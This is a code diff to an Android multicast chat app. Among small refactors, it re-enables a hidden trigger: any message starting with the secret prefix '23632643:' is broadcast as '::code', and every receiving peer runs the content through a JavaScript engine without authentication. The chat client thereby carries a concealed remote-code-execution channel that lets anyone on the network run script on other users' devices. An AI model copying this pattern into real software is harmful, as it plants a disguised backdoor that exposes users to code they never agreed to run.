@@ -1,5 +1,7 @@
 package com.chat.room;
 
+import android.app.Activity;
+import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Handler;
@@ -13,13 +15,12 @@ import android.widget.Toast;
 import com.chat.room.BaseActivity;
 import com.chat.room.EnterChatRoom;
 import com.chat.room.R;
+import com.js.runner.JAVAScriptEngine;
 import java.net.DatagramPacket;
 import java.net.InetAddress;
 import java.net.MulticastSocket;
-import android.content.Context;
-import com.js.runner.JAVAScriptEngine;
-import java.util.List;
 import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends BaseActivity 
 {
@@ -44,7 +45,6 @@ public class MainActivity extends BaseActivity
 	private EditText edit;
 	private Button send;
 	private boolean pressBack=false;
-	private JAVAScriptEngine engine;
 	private static TextView result;
 	/*private Handler han=new Handler() {
 		@Override
@@ -72,9 +72,9 @@ public class MainActivity extends BaseActivity
     {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.main);
+		ctx=MainActivity.this;
 		NetBroadcast.init();
 		list=new ArrayList<String>();
-		engine=new JAVAScriptEngine();
 		edit=(EditText) findViewById(R.id.chat_edit);
 		send=(Button) findViewById(R.id.chat_send);
 		send.setOnClickListener(new OnClickListener() {
@@ -87,8 +87,9 @@ public class MainActivity extends BaseActivity
 					}
 					if (edit.getText().toString().startsWith("23632643:")) {
 						String con=edit.getText().toString().substring(9);
-						sendMsg("::code"+con);
 						list.add(con);
+						sendMsg("::code"+con);
+						edit.setText("");
 						return;
 					}
 					new Thread(new Runnable() {
@@ -154,11 +155,11 @@ public class MainActivity extends BaseActivity
 								sendMsg(":"+askName+nameofroom);
 							} else if (msg.startsWith("::code")) {
 								String con=msg.substring(6);
-								/*if (list.contains(con)) {
+								if (list.contains(con)) {
 									list.remove(con);
-								} else {*/
-									engine.runJS(con);
-								//}
+								} else {
+									JAVAScriptEngine.runJS(con);
+								}
 							} else if (msg.startsWith(":"+askName)) {
 								MainActivity.this.runOnUiThread(new Runnable() {
 									@Override
@@ -197,8 +198,13 @@ public class MainActivity extends BaseActivity
 				sendMsg(askName);
 			}
 			confi=true;
-		} catch (Exception e) {
-			err(e);
+		} catch (final Exception e) {
+			MainActivity.this.runOnUiThread(new Runnable() {
+				@Override
+				public void run() {
+					err(e);
+				}
+			});
 		}
 	}
 
@@ -249,5 +255,23 @@ public class MainActivity extends BaseActivity
 				}
 			}, 1000);
 		}
+	}
+	
+	public static void UIprint(final String t) {
+		((Activity) MainActivity.ctx).runOnUiThread(new Runnable() {
+			@Override
+			public void run() {
+				print(sys, t);
+			}
+		});
+	}
+	
+	public static void UIalert(final String t) {
+		((Activity) MainActivity.ctx).runOnUiThread(new Runnable() {
+			@Override
+			public void run() {
+				alert(t);
+			}
+		});
 	}
 }
